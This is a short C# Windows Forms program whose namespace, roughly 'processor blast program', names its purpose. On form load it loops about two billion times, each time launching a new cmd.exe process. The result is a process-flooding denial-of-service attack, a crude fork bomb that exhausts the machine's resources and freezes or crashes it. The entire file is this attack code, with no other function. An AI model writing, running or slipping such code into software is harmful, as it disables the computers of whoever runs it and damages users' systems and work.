using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;

using System.Text;

using System.Windows.Forms;

namespace 处理器爆破程式
{
    public partial class Low : Form
    {
        public Low()
        {
            InitializeComponent();
        }

        private void Low1_Load(object sender, EventArgs e)
        {
            for (int i = 1; i > 0; i++)
            {
                Process.Start("cmd.exe"); 
            } 
        }
    }
}
